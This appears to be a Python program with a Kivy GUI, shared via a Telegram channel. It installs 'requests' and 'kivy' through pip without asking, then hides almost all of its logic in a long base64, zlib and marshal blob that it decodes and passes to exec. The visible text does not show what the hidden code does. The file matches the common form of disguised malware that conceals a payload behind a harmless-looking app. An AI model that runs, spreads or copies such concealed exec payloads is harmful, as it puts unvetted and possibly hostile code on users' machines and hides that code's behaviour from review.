# Obfuscated with PyObfuscate
# TELEGRAM: t.me/blacksheep_b
# Time : Mon Sep 30 21:46:31 2024
# -------------------------------

import subprocess
import sys

# Função para instalar pacotes
def instalar_pacote(pacote):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pacote])

# Lista de pacotes necessários
pacotes = ["requests", "kivy"]

# Verifica e instala pacotes necessários
for pacote in pacotes:
    try:
        __import__(pacote)  # Tenta importar o pacote
    except ImportError:
        print(f"{pacote} não encontrado. Instalando...")
        instalar_pacote(pacote)

import os
import logging
import requests
import sys
from io import BytesIO
from threading import Thread
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.uix.progressbar import ProgressBar
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.core.image import Image as CoreImage
from kivy.utils import platform
from kivy.clock import Clock
from kivy.graphics import Color, RoundedRectangle
from kivy.config import Config

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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